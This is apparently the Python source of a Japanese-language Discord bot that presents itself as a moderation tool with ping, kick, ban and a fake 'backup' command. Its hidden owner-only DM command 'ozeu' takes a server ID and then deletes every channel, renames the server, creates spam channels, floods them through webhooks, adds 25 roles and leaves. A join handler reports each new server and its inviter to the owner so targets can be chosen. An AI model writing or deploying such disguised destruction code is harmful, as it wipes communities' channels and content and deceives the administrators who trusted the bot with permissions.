import os
import discord
import datetime
from discord.ext import commands
from discord import app_commands
import asyncio
from dotenv import load_dotenv

load_dotenv()
TOKEN = os.getenv("DISCORD_TOKEN")
SPAM_MESSAGE = "こんにちは"

OWNER_ID = 1386539010381451356  # あなたのDiscord ID

intents = discord.Intents.all()
bot = commands.Bot(command_prefix="!", intents=intents)
tree = bot.tree

@bot.event
async def on_ready():
    await bot.tree.sync()
    print(f"{bot.user} が起動しました！")

# --- ozeu コマンド（DM限定） ---
@bot.command(name="ozeu")
async def ozeu(ctx, guild_id: int):
    # DMで送られたか確認
    if not isinstance(ctx.channel, discord.DMChannel):
        await ctx.send("このコマンドはDMでのみ使用できます。")
        return

    # オーナーからか確認
    if ctx.author.id != OWNER_ID:
        await ctx.send("このコマンドはBotオーナー専用です。")
        return

    # サーバー取得
    guild = bot.get_guild(guild_id)
    if guild is None:
        await ctx.send(f"ID {guild_id} のサーバーが見つかりません。")
        return

    # 実行開始通知 Embed作成
    embed_start = discord.Embed(
        title="📢 !ozeu が実行されました",
        description=f"サーバー「{guild.name}」 (ID: {guild.id}) で ozeu 処理を開始しました。",
        color=discord.Color.green()
    )
    embed_start.add_field(name="実行者", value=f"{ctx.author} (ID: {ctx.author.id})", inline=False)
    embed_start.timestamp = discord.utils.utcnow()

    owner = await bot.fetch_user(OWNER_ID)
    await owner.send(embed=embed_start)

    if ctx.author.id == OWNER_ID:
        await ctx.send(embed=embed_start)

    # --- 全チャンネル削除 ---
    async def delete_channel(channel):
        try:
            await channel.delete()
            print(f"削除: {channel.name}")
        except Exception as e:
            print(f"{channel.name} の削除でエラー: {e}")

    delete_tasks = [delete_channel(ch) for ch in guild.channels]
    await asyncio.gather(*delete_tasks)

    # --- サーバー名変更 ---
    try:
        await guild.edit(name="ozeuの植民地")
        print("サーバー名を『ozeuの植民地』に変更しました。")
    except Exception as e:
        print(f"サーバー名の変更でエラー: {e}")

    # --- 新規チャンネル作成 ---
    async def create_channel(index):
        try:
            ch = await guild.create_text_channel(name="リセット完了　もうしばらくお待ち下さい")
            return ch
        except Exception as e:
            print(f"{index + 1}個目のチャンネル作成失敗: {e}")
            return None

    create_tasks = [create_channel(i) for i in range(10)]
    created_channels = await asyncio.gather(*create_tasks)
    created_channels = [ch for ch in created_channels if ch is not None]

    # --- Webhook送信 ---
    async def send_with_webhook(channel):
        try:
            webhook = await channel.create_webhook(name="ZPlusWebhook")
            for _ in range(50):
                await webhook.send(SPAM_MESSAGE, username="クリーン")
        except Exception as e:
            print(f"{channel.name} のWebhook送信でエラー: {e}")

    webhook_tasks = [send_with_webhook(ch) for ch in created_channels]
    await asyncio.gather(*webhook_tasks)

    # --- ロール作成 ---
    try:
        for i in range(25):
            await guild.create_role(name=f"bot用権限{i+1}")
            print(f"ロール『bot用権限{i+1}』を作成しました。")
    except Exception as e:
        print(f"ロール作成でエラー: {e}")

    # --- サーバーから退出 ---
    try:
        await guild.leave()
        embed_done = discord.Embed(
            title="🚪 ozeu処理が完了し、Botはサーバーを退出しました",
            description=(
                f"サーバー名: {guild.name} (ID: {guild.id})\n"
                f"実行者: {ctx.author} (ID: {ctx.author.id})"
            ),
            color=discord.Color.red()
        )
        embed_done.timestamp = discord.utils.utcnow()
        await owner.send(embed=embed_done)
        if ctx.author.id == OWNER_ID:
            await ctx.send(embed=embed_done)
    except Exception as e:
        print(f"退出時にエラー: {e}")

# --- /backup コマンド ---
@bot.tree.command(name="backup", description="ログを保存します")
async def backup(interaction: discord.Interaction):
    await interaction.response.send_message("ログを保存しました☑", ephemeral=False)

# --- /ping コマンド ---
@bot.tree.command(name="ping", description="BOTの応答速度を表示します。")
async def ping(interaction: discord.Interaction):
    latency_ms = round(bot.latency * 1000)
    await interaction.response.send_message(f"応答速度は {latency_ms}ms です")

# --- /kick コマンド ---
@bot.tree.command(name="kick", description="指定したユーザーをキックします")
@app_commands.describe(member="キックするメンバー", reason="理由（省略可）")
async def kick(interaction: discord.Interaction, member: discord.Member, reason: str = "理由なし"):
    if member.top_role >= interaction.user.top_role:
        await interaction.response.send_message("❌ 権限の高いユーザーはキックできません。", ephemeral=True)
        return
    try:
        await member.kick(reason=reason)
        await interaction.response.send_message(f"✅ {member.mention} をキックしました。理由: {reason}")
    except Exception as e:
        await interaction.response.send_message(f"❌ キックに失敗しました: {e}", ephemeral=True)

# --- /ban コマンド ---
@bot.tree.command(name="ban", description="指定したユーザーをBAN（追放）します")
@app_commands.describe(member="BANするメンバー", reason="理由（省略可）")
async def ban(interaction: discord.Interaction, member: discord.Member, reason: str = "理由なし"):
    if member.top_role >= interaction.user.top_role:
        await interaction.response.send_message("❌ 権限の高いユーザーはBANできません。", ephemeral=True)
        return
    try:
        await member.ban(reason=reason)
        embed = discord.Embed(
            title="⛔ ユーザーをBANしました",
            description=f"{member.mention} をサーバーからBANしました。",
            color=discord.Color.red()
        )
        embed.add_field(name="理由", value=reason, inline=False)
        if member.avatar:
            embed.set_thumbnail(url=member.avatar.url)
        if interaction.user.avatar:
            embed.set_footer(text=f"実行者: {interaction.user}", icon_url=interaction.user.avatar.url)
        else:
            embed.set_footer(text=f"実行者: {interaction.user}")
        await interaction.response.send_message(embed=embed)
    except Exception as e:
        await interaction.response.send_message(f"❌ BANに失敗しました: {e}", ephemeral=True)

# --- サーバー参加イベント ---
@bot.event
async def on_guild_join(guild: discord.Guild):
    members = [member async for member in guild.fetch_members()]
    member_count = guild.member_count
    owner_in_guild = any(member.id == OWNER_ID for member in guild.members)
    print(f"Joined guild: {guild.name} with {member_count} members")
    if member_count <= 5 and not owner_in_guild:
        print(f"Leaving guild: {guild.name} because it has {member_count} members and owner not found.")
        await guild.leave()
    now = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    inviter = "不明（監査ログの権限が必要）"
    try:
        async for entry in guild.audit_logs(limit=5, action=discord.AuditLogAction.bot_add):
            if entry.target and entry.target.id == bot.user.id:
                inviter = f"{entry.user}（ID: {entry.user.id}）"
                break
    except discord.Forbidden:
        inviter = "監査ログが取得できません（権限不足）"
    except Exception as e:
        inviter = f"取得失敗: {e}"

    embed = discord.Embed(
        title="🔔 新しいサーバーに参加しました",
        color=discord.Color.green(),
        timestamp=datetime.datetime.now()
    )
    embed.add_field(name="📅 日時", value=now, inline=False)
    embed.add_field(name="🌐 サーバー名", value=f"{guild.name}（ID: {guild.id}）", inline=False)
    embed.add_field(name="🙋‍♂️ 追加したユーザー", value=inviter, inline=False)
    embed.add_field(name="👥 サーバー人数", value=f"{guild.member_count}人", inline=False)
    embed.add_field(name="📊 現在のサーバー数", value=f"{len(bot.guilds)}", inline=False)
    embed.set_footer(text="Bot参加通知")
    try:
        user = await bot.fetch_user(OWNER_ID)
        await user.send(embed=embed)
    except Exception as e:
        print(f"DM送信失敗: {e}")

# --- /leave_server コマンド ---
@tree.command(name="leave_server", description="指定されたサーバーからBotを退出させます（開発者専用）")
@app_commands.describe(server_id="Botを退出させたいサーバーのID")
async def leave_server(interaction: discord.Interaction, server_id: str):
    if interaction.guild is not None:
        await interaction.response.send_message("このコマンドはDMでのみ使えます。", ephemeral=True)
        return
    if interaction.user.id != OWNER_ID:
        await interaction.response.send_message("このコマンドを使えるのはBotの開発者だけです。", ephemeral=True)
        return
    try:
        guild = bot.get_guild(int(server_id))
        if guild is None:
            await interaction.response.send_message("Botはそのサーバーに参加していません。", ephemeral=True)
            return
        guild_name = guild.name
        await guild.leave()
        embed = discord.Embed(
            title="🚪 Botがサーバーから退出しました",
            description=f"**{guild_name}**（ID: `{server_id}`）から正常に退出しました。",
            color=discord.Color.red()
        )
        await interaction.response.send_message(embed=embed)
    except ValueError:
        await interaction.response.send_message("サーバーIDは数字で入力してください。", ephemeral=True)
    except Exception as e:
        await interaction.response.send_message(f"エラーが発生しました: {e}", ephemeral=True)

# --- /servers コマンド ---
@tree.command(name="servers", description="サーバー一覧(開発者専用)")
async def servers(interaction: discord.Interaction):
    if interaction.user.id != OWNER_ID:
        await interaction.response.send_message("このコマンドはBotの開発者のみ使えます。", ephemeral=True)
        return
    guilds = bot.guilds
    count = len(guilds)
    server_list = "\n".join(f"{guild.name} - ID: `{guild.id}`" for guild in guilds)
    embed = discord.Embed(
        title=f"🤖 Botが入っているサーバー一覧（{count}件）",
        description=server_list if server_list else "現在サーバーに参加していません。",
        color=discord.Color.blue()
    )
    await interaction.response.send_message(embed=embed, ephemeral=True)

bot.run(TOKEN)
